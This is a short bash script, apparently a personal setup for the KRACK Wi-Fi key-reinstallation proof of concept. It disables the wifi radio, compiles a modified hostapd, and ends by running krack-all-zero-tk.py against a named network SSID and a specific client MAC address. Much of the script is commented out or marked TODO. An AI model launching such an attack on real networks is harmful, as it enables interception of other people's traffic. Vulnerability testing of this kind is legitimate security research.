#!/bin/bash

# Install dependencies
echo "Setting up dependencies..."


#Disable network, but ensure the script can still use wifi
sudo nmcli radio wifi off
#sudo airmon-ng check kill
sudo rfkill unblock wifi


# Set interface variables:
#eth0=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | awk 'FNR==1' | tr -d ':')

#wlan0=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | awk 'FNR==3' | tr -d ':')

#wlan1=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | awk 'FNR==4' | tr -d ':')

# Replace hard-coded interface value in dnsmasq.conf
#sed -i 1s/.*/interface=$(sed '2q;d' $wlan1)/ ./krackattacks-poc-zerokey/krackattack/dnsmasq.conf

# Replace hard-coded interface values in enable_internet_forwarding.sh

#TODO should test whether we can use wlan1 0 to forward traffic, of it it's busy monitoring.
#sed -i 5s/.*/INTERNET=$(sed '5q;d' $eth0)/ ./krackattacks-poc-zerokey/krackattack/enable_internet_forwarding.sh

#sed -i 7s/.*/REPEATER=$(sed '7q;d' $wlan1)/ ./krackattacks-poc-zerokey/krackattack/enable_internet_forwarding.sh

# Make modified hostapd instance. Only needs to be done once
if [[ ! -x "./krackattacks-poc-zerokey/hostapd/hostapd" ]] 
then 
	echo "Compiling hostapd"
	cd ./krackattacks-poc-zerokey/hostapd/
	cp defconfig .config
	make -j 2 1>/dev/null
	cd ../../
fi

# TODO should only be run the first time!
#./findVulnerable/krackattack/disable-hwcrypto.sh

# Disable hardware encryption, as bugs on some Wi-Fi network interface cards could interfere with the script used to check whether a client is vulnerable

# TODO Let user choose whether to reboot computer
## NOTE not implemented
#TODO RUN: systool -vm ath9k_htc








## TODO To check: the nohwcript/.. param has been set.

# TODO Look for key reinstallations in the 4-way handshake
./krackattacks-poc-zerokey/krackattack/krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 54:27:58:63:14:aa

